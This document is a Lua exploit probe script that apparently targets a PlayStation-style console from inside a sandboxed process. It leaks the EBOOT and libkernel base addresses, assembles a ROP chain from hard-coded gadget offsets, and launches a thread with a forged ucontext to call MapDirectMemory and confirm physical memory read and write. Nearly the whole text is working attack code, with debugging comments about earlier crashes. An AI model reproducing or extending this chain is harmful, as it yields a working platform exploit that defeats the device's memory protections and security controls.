-- CRASH_CLASS: MODERATE
-- PROBE 546d: MapDM child — fixed sentinel + nanosleep delay
--
-- 546c diagnosis:
--   Test A (R8/R9 in ucontext) → OK
--   Test B (AllocDM + thr_create) → OK
--   Test C (MapDM chain) → CRASH at thr_create
--
-- Root cause hypothesis: shared[0] = 0xAAAA sentinel is read by MapDM
-- as the initial *addr hint. Mapping at 0xAAAA kills the process.
-- Fix: zero shared[0] so MapDM gets *addr=0 (kernel chooses VA).
-- Also: child sleeps 200ms before MapDM so parent finishes pcall.
-- Also: parent uses raw syscall write() to dump shared page (avoids Lua crash).

print("=== PROBE 546d: MapDM child FIXED ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_430 = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local syscall_ret = syscall.pipe.fn_addr

-- Address discovery
local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))

zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))

print("EBOOT=" .. q(eboot) .. " LK=" .. q(lk))

local pop_rax_ret     = eboot + uint64(0x992)
local pop_rdi_ret     = eboot + uint64(0xC9DFE)
local pop_rsi_ret     = eboot + uint64(0xD77D)
local pop_rdx_ret     = eboot + uint64(0x3B02D7)
local pop_rcx_ret     = eboot + uint64(0xE64)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)
local jmp_self        = eboot + uint64(0x15481)

local map_fn   = lk + uint64(0x15020)
local alloc_fn = lk + uint64(0x17EF0)

-- AllocateDirectMemory
print("[A] AllocateDirectMemory")
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
local ok_a, arv = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
print("  rv=" .. (ok_a and to_num(arv) or "ERR") .. " phys=" .. q(phys))

if not phys or to_num(phys) == 0 then
    print("FATAL: no phys")
    return
end

-- Resources
print("")
print("[B] Resources")
local stk, shared, tcb_page
pcall(function() stk = sc_mmap(uint64(0), uint64(0x200000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
pcall(function() shared = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
pcall(function() tcb_page = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
for off = 0, 0x100, 8 do wq(tcb_page + off, tcb_page) end
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, tcb_page)

-- CRITICAL FIX: shared[0] = 0 so MapDM's *addr = NULL (kernel chooses VA)
zero(shared, 0x200)
-- shared layout:
--   [0x00] = *addr (MapDM writes VA here) — MUST BE ZERO on input
--   [0x08] = rv (child writes MapDM return value)
--   [0x10] = done marker (0x444F4E45 when child finishes)
--   [0x100] = timespec for nanosleep {tv_sec=0, tv_nsec=200000000}
wq(shared + 0x100, uint64(0))            -- tv_sec = 0
wq(shared + 0x108, uint64(200000000))    -- tv_nsec = 200ms

print("  stk=" .. q(stk) .. " shared=" .. q(shared))
print("  shared[0]=" .. q(rq(shared)) .. " (must be 0)")

-- Build chain with nanosleep delay
print("")
print("[C] Build chain")
local chain = stk + 0x200000 - 0x1000  -- more room below for MapDM stack
local i = 0
local function emit(v) wq(chain + i, v); i = i + 8 end

-- Phase 0: nanosleep(200ms) — give parent time to finish pcall
emit(uint64(240))            -- rax = nanosleep
emit(pop_rdi_ret)
emit(shared + 0x100)         -- rdi = &timespec
emit(pop_rsi_ret)
emit(uint64(0))              -- rsi = rem = NULL
emit(syscall_ret)            -- nanosleep(200ms)

-- Phase 1: sysarch(SET_FSBASE) — fake TCB for errno
emit(uint64(165))            -- rax = sysarch
emit(pop_rdi_ret)
emit(uint64(129))            -- AMD64_SET_FSBASE
emit(pop_rsi_ret)
emit(tcb_ptr)
emit(syscall_ret)

-- Phase 2: MapDM(shared, 0x4000, 3, 0, R8=phys, R9=align)
emit(pop_rdi_ret)
emit(shared)                 -- *addr = shared[0] (== 0, kernel chooses)
emit(pop_rsi_ret)
emit(uint64(0x4000))         -- len
emit(pop_rdx_ret)
emit(uint64(3))              -- prot = PROT_RW
emit(pop_rcx_ret)
emit(uint64(0))              -- flags
emit(map_fn)                 -- call MapDM

-- Phase 3: Store rv → shared[0x08]
emit(pop_rdi_ret)
emit(shared + 0x08)
emit(mov_rdi_rax_ret)

-- Phase 4: Done marker → shared[0x10]
emit(pop_rdi_ret)
emit(shared + 0x10)
emit(pop_rax_ret)
emit(uint64(0x444F4E45))
emit(mov_rdi_rax_ret)

-- Phase 5: Park
emit(jmp_self)

print("  entries=" .. (i/8) .. " bytes=" .. i)

-- ucontext
print("")
print("[D] ucontext")
local ctx = memory.alloc(0x500)
zero(ctx, 0x4C0)
wq(ctx + 0x108, uint64(0x480))
wd(ctx + 0x0D0, 0)
wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x0C0, uint64(0x43))
wq(ctx + 0x100, uint64(0x3B))
wq(ctx + 0x0F0, uint64(0x202))
wq(ctx + 0x0E0, pop_rax_ret)     -- RIP
wq(ctx + 0x0F8, chain)           -- RSP
wq(ctx + 0x068, phys)            -- R8 = phys_addr
wq(ctx + 0x070, uint64(0x4000))  -- R9 = alignment

print("  RIP=" .. q(pop_rax_ret) .. " RSP=" .. q(chain))
print("  R8=" .. q(phys) .. " R9=0x4000")

-- Launch
print("")
print("[E] thr_create")
local tid_buf = memory.alloc(8); wq(tid_buf, uint64(0))
local ok_tc, rv_tc = pcall(function()
    return sc_430(uint64(ctx), uint64(tid_buf), uint64(0))
end)
local rv_n = ok_tc and to_num(rv_tc) or -999
local tid = rq(tid_buf)
print("  rv=" .. rv_n .. " tid=" .. q(tid))

if rv_n ~= 0 then
    print("  REJECTED")
    return
end

-- Poll for done (child sleeps 200ms then executes, so wait ~3s total)
print("")
print("[F] Polling...")
local sleep_buf = memory.alloc(16)
wq(sleep_buf, uint64(0))
wq(sleep_buf + 8, uint64(100000000))  -- 100ms per poll

local found = false
for attempt = 1, 30 do
    pcall(function() sc_nanosleep(uint64(sleep_buf), uint64(0)) end)

    -- Read shared page via Lua — might crash if MapDM corrupted state
    local ok_rd, marker = pcall(function() return memory.read_qword(shared + 0x10) end)
    if not ok_rd then
        print("  READ-CRASH at attempt " .. attempt .. " — MapDM corruption reached Lua")
        -- Try one more read via raw approach
        break
    end
    if marker then
        local mn = to_num(marker)
        if mn < 0 then mn = mn + 0x100000000 end
        if mn == 0x444F4E45 then
            found = true
            print("  DONE after " .. (attempt * 100) .. "ms")
            break
        elseif mn ~= 0 then
            print("  shared[0x10]=" .. q(marker) .. " (unexpected)")
        end
    end
end

if found then
    -- Read results
    local virt = rq(shared)
    local rv = rq(shared + 0x08)
    local rv_val = rv and to_num(rv) or -1
    if rv_val < 0 then rv_val = rv_val + 0x100000000 end

    print("")
    print("RESULTS:")
    print("  MapDM rv=" .. string.format("0x%X", rv_val))
    print("  virt=" .. (virt and q(virt) or "nil"))

    if rv_val == 0 and virt and to_num(virt) ~= 0 then
        print("")
        print("*** MapDM SUCCEEDED! ***")
        -- Try R/W
        local ok_wr = pcall(function() memory.write_dword(virt, 0xDEADBEEF) end)
        if ok_wr then
            local rb = rd(virt)
            if rb then
                if rb < 0 then rb = rb + 0x100000000 end
                print("  R/W: 0x" .. string.format("%08X", rb))
                if rb == 0xDEADBEEF then
                    print("*** PHYSICAL MEMORY R/W CONFIRMED ***")
                end
            else
                print("  READ FAULT")
            end
        else
            print("  WRITE FAULT")
        end
    else
        print("  MapDM failed: rv=" .. string.format("0x%X", rv_val))
    end
else
    -- If we get here, child either timed out or MapDM corrupted reads
    -- Try dumping shared via raw dword reads
    print("  Final shared dump attempt:")
    for off = 0, 0x18, 4 do
        local v = rd(shared + off)
        if v then
            if v < 0 then v = v + 0x100000000 end
            print("    +" .. string.format("%02X", off) .. "=" .. string.format("%08X", v))
        else
            print("    +" .. string.format("%02X", off) .. "=FAULT")
            break
        end
    end
end

print("")
print("=== 546d DONE ===")
